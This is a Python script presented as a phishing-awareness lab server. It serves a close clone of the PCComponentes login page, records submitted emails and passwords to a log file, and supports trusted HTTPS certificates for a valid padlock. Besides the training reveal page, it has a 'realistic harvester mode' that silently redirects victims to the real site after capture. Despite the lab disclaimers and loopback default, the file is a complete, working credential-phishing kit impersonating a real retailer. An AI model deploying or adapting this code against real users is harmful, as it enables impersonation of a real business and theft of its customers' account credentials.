#!/usr/bin/env python3
"""
Local phishing-awareness lab server (Docker-friendly).

Serves a LOOKALIKE of a well-known retailer's login page (PCComponentes)
and logs any submitted credentials to captured.log. After a capture it
either shows a "you were caught" reveal page (training mode) or silently
redirects to the real site (LAB_REDIRECT_URL, realistic harvester mode).

Authorized use only:
  - Run it only inside a network you own, against test machines you control.
  - This is a training clone: never repoint traffic from machines or users
    you do not control, and never expose this server to the public internet.

Usage:
  python3 server.py [port]        # 8443 when certs exist, 8080 otherwise
Environment:
  LAB_HOST           bind address (default 127.0.0.1)
  LAB_CERT, LAB_KEY  TLS cert/key files (HTTPS when both exist)
  LAB_REDIRECT_URL   if set, POST gets a 302 to this URL instead of the
                     reveal page
"""
import datetime
import html
import http.server
import os
import socketserver
import ssl
import sys
import urllib.parse

# Bind to loopback by default so the lab never leaves this machine.
# Override with LAB_HOST=0.0.0.0 only for a deliberate LAN test.
HOST = os.environ.get("LAB_HOST", "127.0.0.1")
DEFAULT_PORT = 8080
LOG_FILE = "captured.log"

# If both files exist, the server serves over HTTPS. Generate them with mkcert
# so the local CA is trusted and the browser shows a valid padlock.
CERT_FILE = os.environ.get("LAB_CERT", "cert.pem")
KEY_FILE = os.environ.get("LAB_KEY", "key.pem")

# When set, submitted credentials are acknowledged with a 302 to this URL
# (realistic harvester mode). When empty, the lab shows the reveal page.
REDIRECT_URL = os.environ.get("LAB_REDIRECT_URL", "")

LOGIN_PAGE = """<!DOCTYPE html>
<!-- LAB-ONLY credential-harvester clone. Never serve outside your own test network. -->
<html lang="es">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Inicia sesi&oacute;n | PCComponentes</title>
  <style>
    :root { color-scheme: light; --brand:#e5142c; --brand-dark:#7f1d1d; --ink:#1f2937; --muted:#6b7280; --line:#e5e7eb; }
    * { box-sizing: border-box; margin: 0; }
    body { font-family: system-ui, -apple-system, "Segoe UI", Roboto, Arial, sans-serif; color: var(--ink); background: #fff; }
    .topbar { background: var(--brand); color: #fff; padding: 14px 24px; display: flex; gap: 18px; align-items: center; flex-wrap: wrap; }
    .logo { font-size: 21px; font-weight: 800; letter-spacing: .4px; white-space: nowrap; }
    .search { flex: 1; min-width: 220px; display: flex; }
    .search input { flex: 1; padding: 9px 12px; border: 0; border-radius: 4px 0 0 4px; font-size: 14px; }
    .search button { padding: 9px 14px; border: 0; border-radius: 0 4px 4px 0; background: var(--brand-dark); color: #fff; cursor: pointer; font-size: 14px; }
    .toplinks { font-size: 13px; white-space: nowrap; }
    .toplinks span { margin-left: 14px; }
    .cats { border-bottom: 1px solid var(--line); padding: 10px 24px; font-size: 13px; color: var(--muted); }
    .cats span { margin-right: 18px; }
    main { display: flex; justify-content: center; gap: 20px; padding: 44px 24px; flex-wrap: wrap; background: #fafafa; }
    .card { background: #fff; border: 1px solid var(--line); border-radius: 8px; padding: 28px; width: 100%; max-width: 360px; height: fit-content; }
    h1 { font-size: 20px; margin-bottom: 4px; }
    .sub { font-size: 13px; color: var(--muted); margin-bottom: 14px; }
    label { display: block; font-size: 13px; margin: 14px 0 6px; }
    input[type=email], input[type=password] {
      width: 100%; padding: 11px 12px; border: 1px solid #d1d5db; border-radius: 5px; font-size: 15px;
    }
    input[type=email]:focus, input[type=password]:focus { outline: 2px solid var(--brand); border-color: var(--brand); }
    button.submit {
      width: 100%; margin-top: 20px; padding: 12px; border: 0; border-radius: 5px;
      background: var(--brand); color: #fff; font-size: 15px; font-weight: 600; cursor: pointer;
    }
    button.submit:hover { background: #c31124; }
    .help { margin-top: 14px; text-align: center; font-size: 13px; }
    .help a { color: var(--brand); text-decoration: none; }
    .side { width: 100%; max-width: 300px; height: fit-content; }
    .panel { background: #fff; border: 1px solid var(--line); border-radius: 8px; padding: 22px; margin-bottom: 16px; font-size: 14px; line-height: 1.55; }
    .panel b { display: block; margin-bottom: 6px; }
    .panel a { color: var(--brand); text-decoration: none; font-weight: 600; }
    footer { padding: 16px 24px; border-top: 1px solid var(--line); color: #9ca3af; font-size: 11px; text-align: center; }
  </style>
</head>
<body>
  <div class="topbar">
    <span class="logo">PCComponentes</span>
    <div class="search">
      <input type="text" placeholder="Buscar productos" aria-label="Buscar">
      <button type="button">Buscar</button>
    </div>
    <div class="toplinks"><span>Mi cuenta</span><span>Carrito</span></div>
  </div>
  <div class="cats">
    <span>Componentes</span><span>Port&aacute;tiles</span><span>Smartphones</span>
    <span>Perif&eacute;ricos</span><span>Gaming</span><span>Ofertas</span>
  </div>
  <main>
    <form class="card" method="POST" action="/login">
      <h1>Inicia sesi&oacute;n</h1>
      <p class="sub">Accede con tu cuenta para continuar</p>
      <label for="email">Email</label>
      <input id="email" name="email" type="email" autocomplete="username" required>
      <label for="password">Contrase&ntilde;a</label>
      <input id="password" name="password" type="password" autocomplete="current-password" required>
      <button class="submit" type="submit">Entrar</button>
      <div class="help"><a href="#">&iquest;Has olvidado tu contrase&ntilde;a?</a></div>
    </form>
    <aside class="side">
      <div class="panel">
        <b>&iquest;Todav&iacute;a no tienes cuenta?</b>
        Reg&iacute;strate y accede a ofertas exclusivas, seguimiento de pedidos
        y facturas. <a href="#">Crear cuenta</a>
      </div>
      <div class="panel">
        <b>Compra segura</b>
        Pago protegido, env&iacute;o en 24 h y devoluciones gratuitas.
      </div>
    </aside>
  </main>
  <footer>Clon de laboratorio con fines educativos — sin relaci&oacute;n con PCComponentes</footer>
</body>
</html>"""

RESULT_PAGE = """<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Clon de laboratorio</title>
  <style>
    body {
      margin: 0; min-height: 100vh; display: flex; align-items: center;
      justify-content: center; font-family: system-ui, Arial, sans-serif;
      background: #7f1d1d;
    }
    .card {
      max-width: 460px; margin: 24px; padding: 32px; background: #fff;
      border-radius: 10px; box-shadow: 0 12px 40px rgba(0,0,0,.35);
    }
    h1 { color: #b91c1c; margin: 0 0 12px; font-size: 20px; }
    p { color: #374151; line-height: 1.5; }
    code { background: #f3f4f6; padding: 2px 6px; border-radius: 4px; }
  </style>
</head>
<body>
  <div class="card">
    <h1>&#9888; Has iniciado sesi&oacute;n en el CLON del laboratorio</h1>
    <p>Esta NO es la p&aacute;gina real de PCComponentes: navegaste hacia un
       servidor de pruebas de tu propia red.</p>
    <p>El email <code>{{USER}}</code> y su contrase&ntilde;a acaban de quedar
       registrados en <code>captured.log</code> del servidor.</p>
    <p>Fin del ejercicio. Lecci&oacute;n: el candado HTTPS solo garantiza que la
       conexi&oacute;n va cifrada hacia un servidor cuya CA conf&iacute;a tu
       dispositivo — no que el sitio sea leg&iacute;timo.</p>
  </div>
</body>
</html>"""


class Handler(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        # Any path returns the login page, mimicking a portal that always
        # redirects unauthenticated users to the login screen.
        self._send_html(LOGIN_PAGE)

    def do_POST(self):
        length = int(self.headers.get("Content-Length", 0))
        body = self.rfile.read(length).decode("utf-8", "replace")
        fields = urllib.parse.parse_qs(body)
        email = fields.get("email", fields.get("username", [""]))[0]
        password = fields.get("password", [""])[0]
        self._log(email, password)
        if REDIRECT_URL:
            self.send_response(302)
            self.send_header("Location", REDIRECT_URL)
            self.end_headers()
            return
        page = RESULT_PAGE.replace("{{USER}}", html.escape(email) or "(vacío)")
        self._send_html(page)

    def _log(self, email, password):
        stamp = datetime.datetime.now().isoformat(timespec="seconds")
        line = f"{stamp}\t{self.client_address[0]}\temail={email!r}\tpass={password!r}\n"
        with open(LOG_FILE, "a", encoding="utf-8") as fh:
            fh.write(line)
        print("[CAPTURED] " + line.strip(), flush=True)

    def _send_html(self, body):
        data = body.encode("utf-8")
        self.send_response(200)
        self.send_header("Content-Type", "text/html; charset=utf-8")
        self.send_header("Content-Length", str(len(data)))
        self.end_headers()
        self.wfile.write(data)

    def log_message(self, *args):
        pass  # Silence default request logging; captures are printed explicitly.


def main():
    tls = os.path.exists(CERT_FILE) and os.path.exists(KEY_FILE)
    default_port = 8443 if tls else DEFAULT_PORT
    port = int(sys.argv[1]) if len(sys.argv) > 1 else default_port

    socketserver.ThreadingTCPServer.allow_reuse_address = True
    httpd = socketserver.ThreadingTCPServer((HOST, port), Handler)
    scheme = "http"
    if tls:
        context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
        context.load_cert_chain(certfile=CERT_FILE, keyfile=KEY_FILE)
        httpd.socket = context.wrap_socket(httpd.socket, server_side=True)
        scheme = "https"

    with httpd:
        print(f"Lab clone serving on {scheme}://{HOST}:{port}  (Ctrl+C to stop)")
        print(f"Captured credentials are appended to ./{LOG_FILE}")
        try:
            httpd.serve_forever()
        except KeyboardInterrupt:
            print("\nStopped.")


if __name__ == "__main__":
    main()
